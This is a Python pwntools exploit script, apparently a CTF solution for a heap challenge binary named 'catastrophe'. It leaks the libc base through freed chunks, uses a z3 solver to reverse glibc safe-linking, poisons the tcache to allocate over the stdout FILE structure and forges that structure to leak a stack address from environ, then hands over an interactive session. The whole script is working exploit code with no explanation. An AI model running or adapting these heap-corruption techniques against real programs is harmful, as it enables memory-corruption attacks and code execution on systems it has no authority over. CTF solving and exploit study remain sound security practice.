#!/usr/bin/python3

from pwn import *
from z3 import *
exe = ELF('catastrophe_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
def unsafe_link(e):
    high_e = e & 0xfffffff000000000
    x = BitVec('x',64)
    s = Solver()
    s.add(x & 0xfffffff000000000 == high_e)
    s.add(x ^ (x >> 12) == e)
    s.check()
    return s.model()[x].as_long()

def malloc(idx, size, payload):
        sla(b"> ", str(1).encode())
        sla(b"> ", str(idx).encode())
        sla(b"> ", str(size).encode())
        sla(b": ", payload)

def free(idx):
        sla(b"> ", str(2).encode())
        sla(b"> ", str(idx).encode())
        
def view(idx):
        sla(b"> ", str(3).encode())
        sla(b"> ", str(idx).encode())
        return u64(p.recvline(keepends = False).ljust(8, b'\0'))
        
for i in range (9):
        malloc(i, 0x100, b'aaaa')
malloc(9, 0x150, b'aaaa')

for i in range (7):
    free(i)
free(8)
free(7)
malloc(2, 0x100, b'aaaa')
free(8)
libc.address = view(7) - 0x21cce0 + 0x3000
info("Libc base: " + hex(libc.address))
# heap = unsafe_link(view(1)) - 0x2a0
heap = 0x55555555a000
info("heap base: " + hex(heap))

payload = b'a' * 0x100
payload+= flat(
        0, 0x111,
        (libc.sym['_IO_2_1_stdout_'] - 0x10) ^ ((heap+0xb20) >> 12)
)
malloc(7, 0x200, payload)
malloc(8, 0x100, b'1111')
f = FileStructure()
# f._IO_write_ptr = libc.sym.environ
f.flags = -72537977
f._IO_read_ptr = libc.sym.environ
f._IO_read_end = libc.sym.environ
f._IO_read_base = libc.sym.environ
f._IO_write_base = libc.sym.environ
f._IO_write_ptr = libc.sym.environ+8
f._IO_write_end = libc.sym.environ+8
f._IO_buf_base = libc.sym.environ+8
f._IO_buf_end = libc.sym.environ +8

payload = p64(0) + p64(libc.sym._IO_file_jumps)
payload += p64(0xfbad1800)*4 + p64(libc.sym.environ) + p64(libc.sym.environ+8)
malloc(9, 0x100, payload)
stack = u64(p.recvline(keepends = False))
info("stack: " + hex(stack))
p.interactive()
